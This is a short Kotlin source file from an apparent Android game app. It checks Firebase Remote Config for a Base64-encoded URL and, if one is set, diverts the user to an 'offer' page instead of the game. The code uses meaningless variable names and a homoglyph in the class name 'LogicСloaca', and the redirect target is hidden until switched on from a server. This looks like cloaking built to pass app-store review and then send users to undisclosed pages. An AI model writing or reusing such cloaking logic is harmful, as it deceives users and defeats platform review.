package com.diego.dogcraft.logiccloaca
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import logic_cloaca.StaticVariables
import java.util.Base64


object LogicСloaca {



    fun fireBaseRemoteConfig(goGame: () -> Unit, goOffer:() ->Unit) {
        val dsjkhjkfhdsfhds = FirebaseRemoteConfig.getInstance()


        try {
            dsjkhjkfhdsfhds.fetchAndActivate()
                .addOnCompleteListener { dzmjdshfjksd ->
                    if (dzmjdshfjksd.isSuccessful&&FirebaseRemoteConfig.getInstance().getString(SDKkey.FBlink).isNotBlank() ) {
                        try {
                            val link = decodeBase64(FirebaseRemoteConfig.getInstance().getString(SDKkey.FBlink))
                            StaticVariables.urlFinal = link
                            goOffer()
                        } catch (e:Exception) {
                         goGame()
                        }


                    } else {
                        goGame()
                    }
                }
        } catch (e:Exception){
            goGame()
        }
    }

                    }

fun decodeBase64(encodedString: String): String {
    val decodedBytes = Base64.getDecoder().decode(encodedString)
    return String(decodedBytes, Charsets.UTF_8)
}